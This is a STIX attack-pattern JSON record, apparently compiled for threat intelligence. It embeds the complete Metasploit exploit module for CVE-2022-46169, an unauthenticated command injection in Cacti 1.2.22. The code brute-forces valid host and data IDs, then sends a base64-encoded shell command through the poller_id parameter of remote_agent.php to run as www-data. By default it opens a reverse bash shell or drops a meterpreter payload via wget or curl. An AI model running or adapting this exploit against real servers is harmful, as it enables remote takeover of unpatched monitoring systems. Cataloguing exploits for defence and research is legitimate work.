{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--239bb487-a69d-4368-a924-89a02c33ee51",
    "created": "2024-08-14T17:02:26.613201Z",
    "modified": "2024-08-14T17:02:26.613205Z",
    "name": "Cacti 1.2.22 unauthenticated command injection",
    "description": " This module exploits an unauthenticated command injection",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/cacti_unauthenticated_cmd_injection.rb",
            "external_id": "cacti_unauthenticated_cmd_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-46169"
        },
        {
            "source_name": "reference",
            "url": "https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution#analysisbyStefanSchiller"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cacti 1.2.22 unauthenticated command injection',\n        'Description' => %q{\n          This module exploits an unauthenticated command injection\n          vulnerability in Cacti through 1.2.22 (CVE-2022-46169) in\n          order to achieve unauthenticated remote code execution as the\n          www-data user.\n\n          The module first attempts to obtain the Cacti version to see\n          if the target is affected. If LOCAL_DATA_ID and/or HOST_ID\n          are not set, the module will try to bruteforce the missing\n          value(s). If a valid combination is found, the module will\n          use these to attempt exploitation. If LOCAL_DATA_ID and/or\n          HOST_ID are both set, the module will immediately attempt\n          exploitation.\n\n          During exploitation, the module sends a GET request to\n          /remote_agent.php with the action parameter set to polldata\n          and the X-Forwarded-For header set to the provided value for\n          X_FORWARDED_FOR_IP (by default 127.0.0.1). In addition, the\n          poller_id parameter is set to the payload and the host_id\n          and local_data_id parameters are set to the bruteforced or\n          provided values. If X_FORWARDED_FOR_IP is set to an address\n          that is resolvable to a hostname in the poller table, and the\n          local_data_id and host_id values are vulnerable, the payload\n          set for poller_id will be executed by the target.\n\n          This module has been successfully tested against Cacti\n          version 1.2.22 running on Ubuntu 21.10 (vulhub docker image)\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Stefan Schiller', # discovery (independent of Steven Seeley)\n          'Steven Seeley', # (mr_me) @steventseeley - discovery (independent of Stefan Schiller)\n          'Owen Gong', # @phithon_xg - vulhub PoC\n          'Erik Wynter' # @wyntererik - Metasploit\n        ],\n        'References' => [\n          ['CVE', '2022-46169'],\n          ['URL', 'https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf'], # disclosure and technical details\n          ['URL', 'https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2022-46169'], # vulhub vulnerable docker image and PoC\n          ['URL', 'https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution'] # analysis by Stefan Schiller\n        ],\n        'DefaultOptions' => {\n          'RPORT' => 8080\n        },\n        'Platform' => %w[unix linux],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'Automatic (Unix In-Memory)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' },\n              'Type' => :unix_memory\n            }\n          ],\n          [\n            'Automatic (Linux Dropper)',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'CmdStagerFlavor' => ['echo', 'printf', 'wget', 'curl'],\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' },\n              'Type' => :linux_dropper\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2022-12-05',\n        'DefaultTarget' => 1,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The base path to Cacti', '/']),\n      OptString.new('X_FORWARDED_FOR_IP', [true, 'The IP to use in the X-Forwarded-For HTTP header. This should be resolvable to a hostname in the poller table.', '127.0.0.1']),\n      OptInt.new('HOST_ID', [false, 'The host_id value to use. By default, the module will try to bruteforce this.']),\n      OptInt.new('LOCAL_DATA_ID', [false, 'The local_data_id value to use. By default, the module will try to bruteforce this.'])\n    ])\n\n    register_advanced_options([\n      OptInt.new('MIN_HOST_ID', [true, 'Lower value for the range of possible host_id values to check for', 1]),\n      OptInt.new('MAX_HOST_ID', [true, 'Upper value for the range of possible host_id values to check for', 5]),\n      OptInt.new('MIN_LOCAL_DATA_ID', [true, 'Lower value for the range of possible local_data_id values to check for', 1]),\n      OptInt.new('MAX_LOCAL_DATA_ID', [true, 'Upper value for the range of possible local_data_id values to check for', 100])\n    ])\n  end\n\n  def check\n    # sanity check to see if the target is likely Cacti\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    })\n\n    unless res\n      return CheckCode::Unknown('Connection failed.')\n    end\n\n    unless res.code == 200 && res.body.include?('<title>Login to Cacti')\n      return CheckCode::Safe('Target is not a Cacti application.')\n    end\n\n    # get the version\n    version = res.body.scan(/Version (.*?) \\| \\(c\\)/)&.flatten&.first\n    if version.blank?\n      return CheckCode::Detected('Could not determine the Cacti version: the HTTP response body did not match the expected format.')\n    end\n\n    begin\n      if Rex::Version.new(version) <= Rex::Version.new('1.2.22')\n        return CheckCode::Appears(\"The target is Cacti version #{version}\")\n      else\n        return CheckCode::Safe(\"The target is Cacti version #{version}\")\n      end\n    rescue StandardError => e\n      return CheckCode::Unknown(\"Failed to obtain a valid Cacti version: #{e}\")\n    end\n  end\n\n  def exploitable_rrd_names\n    [\n      'apache_total_kbytes',\n      'apache_total_hits',\n      'apache_total_hits',\n      'apache_total_kbytes',\n      'apache_cpuload',\n      'boost_avg_size',\n      'boost_peak_memory',\n      'boost_records',\n      'boost_table',\n      'ExportDuration',\n      'ExportGraphs',\n      'syslogRuntime',\n      'tholdRuntime',\n      'polling_time',\n      'uptime',\n    ]\n  end\n\n  def brute_force_ids\n    # perform a sanity check first\n    if @host_id\n      host_ids = [@host_id]\n    else\n      if datastore['MAX_HOST_ID'] < datastore['MIN_HOST_ID']\n        fail_with(Failure::BadConfig, 'The value for MAX_HOST_ID is lower than MIN_HOST_ID. This is impossible')\n      end\n      host_ids = (datastore['MIN_HOST_ID']..datastore['MAX_HOST_ID']).to_a\n    end\n\n    if @local_data_id\n      local_data_ids = [@local_data_ids]\n    else\n      if datastore['MAX_LOCAL_DATA_ID'] < datastore['MIN_LOCAL_DATA_ID']\n        fail_with(Failure::BadConfig, 'The value for MAX_LOCAL_DATA_ID is lower than MIN_LOCAL_DATA_ID. This is impossible')\n      end\n      local_data_ids = (datastore['MIN_LOCAL_DATA_ID']..datastore['MAX_LOCAL_DATA_ID']).to_a\n    end\n\n    # lets make sure the module never performs more than 1,000 possible requests to try and bruteforce host_id and local_data_id\n    max_attempts = host_ids.length * local_data_ids.length\n    if max_attempts > 1000\n      fail_with(Failure::BadConfig, 'The number of possible HOST_ID and LOCAL_DATA_ID combinations exceeds 1000. Please limit this number by adjusting the MIN and MAX options for both parameters.')\n    end\n\n    potential_targets = []\n    request_ct = 0\n\n    print_status(\"Trying to bruteforce an exploitable host_id and local_data_id by trying up to #{max_attempts} combinations\")\n    host_ids.each do |h_id|\n      print_status(\"Enumerating local_data_id values for host_id #{h_id}\")\n      local_data_ids.each do |ld_id|\n        request_ct += 1\n        print_status(\"Performing request #{request_ct}...\") if request_ct % 25 == 0\n\n        res = send_request_cgi(remote_agent_request(ld_id, h_id, rand(1..1000)))\n        unless res\n          print_error('No response received. Aborting bruteforce')\n          return nil\n        end\n\n        unless res.code == 200\n          print_error(\"Received unexpected response code #{res.code}. This shouldn't happen. Aborting bruteforce\")\n          return nil\n        end\n\n        begin\n          parsed_response = JSON.parse(res.body)\n        rescue JSON::ParserError\n          print_error(\"The response body is not in valid JSON format. This shouldn't happen. Aborting bruteforce\")\n          return nil\n        end\n\n        unless parsed_response.is_a?(Array)\n          print_error(\"The response body is not in the expected format. This shouldn't happen. Aborting bruteforce\")\n          return nil\n        end\n\n        # the array can be empty, which is not an error but just means the local_data_id is not exploitable\n        next if parsed_response.empty?\n\n        first_item = parsed_response.first\n        unless first_item.is_a?(Hash) && ['value', 'rrd_name', 'local_data_id'].all? { |key| first_item.keys.include?(key) }\n          print_error(\"The response body is not in the expected format. This shouldn't happen. Aborting bruteforce\")\n          return nil\n        end\n\n        # some data source types that can be exploited have a valid rrd_name. these are included in the exploitable_rrd_names array\n        # if we encounter one of these, we should assume the local_data_id is exploitable and try to exploit it\n        # in addition, some data source types have an empty rrd_name but are still exploitable\n        # however, if the rrd_name is blank, the only way to verify if a local_data_id value corresponds to an exploitable data source, is to actually try and exploit it\n        # instead of trying to exploit all potential targets of the latter category, let's just save these and print them at the end\n        # then the user can try to exploit them manually by setting the HOST_ID and LOCAL_DATA_ID options\n        rrd_name = first_item['rrd_name']\n        if rrd_name.empty?\n          potential_targets << [h_id, ld_id]\n        elsif exploitable_rrd_names.include?(rrd_name)\n          print_good(\"Found exploitable local_data_id #{ld_id} for host_id #{h_id}\")\n          return [h_id, ld_id]\n        else\n          next # if we have a valid rrd_name but it's not in the exploitable_rrd_names array, we should move on\n        end\n      end\n    end\n\n    return nil if potential_targets.empty?\n\n    # inform the user about potential targets\n    print_warning(\"Identified #{potential_targets.length} host_id - local_data_id combination(s) that may be exploitable, but could not be positively identified as such:\")\n    potential_targets.each do |h_id, ld_id|\n      print_line(\"\\thost_id: #{h_id} - local_data_id: #{ld_id}\")\n    end\n    print_status('You can try to exploit these by manually configuring the HOST_ID and LOCAL_DATA_ID options')\n    nil\n  end\n\n  def execute_command(cmd, _opts = {})\n    # use base64 encoding to get around special char limitations\n    cmd = \"`echo #{Base64.strict_encode64(cmd)} | base64 -d | /bin/bash`\"\n    send_request_cgi(remote_agent_request(@local_data_id, @host_id, cmd), 0)\n  end\n\n  def exploit\n    @host_id = datastore['HOST_ID'] if datastore['HOST_ID'].present?\n    @local_data_id = datastore['LOCAL_DATA_ID'] if datastore['LOCAL_DATA_ID'].present?\n\n    unless @host_id && @local_data_id\n      brute_force_result = brute_force_ids\n      unless brute_force_result\n        fail_with(Failure::NoTarget, 'Failed to identify an exploitable host_id - local_data_id combination.')\n      end\n      @host_id, @local_data_id = brute_force_result\n    end\n\n    if target.arch.first == ARCH_CMD\n      print_status('Executing the payload. This may take a few seconds...')\n      execute_command(payload.encoded)\n    else\n      execute_cmdstager(background: true)\n    end\n  end\n\n  def remote_agent_request(ld_id, h_id, poller_id)\n    {\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'remote_agent.php'),\n      'headers' => {\n        'X-Forwarded-For' => datastore['X_FORWARDED_FOR_IP']\n      },\n      'vars_get' => {\n        'action' => 'polldata',\n        'local_data_ids[0]' => ld_id,\n        'host_id' => h_id,\n        'poller_id' => poller_id # when bruteforcing, this is a random number, but during exploitation this is the payload\n      }\n    }\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-12-05",
    "x_mitre_platforms": [
        "linux'"
    ]
}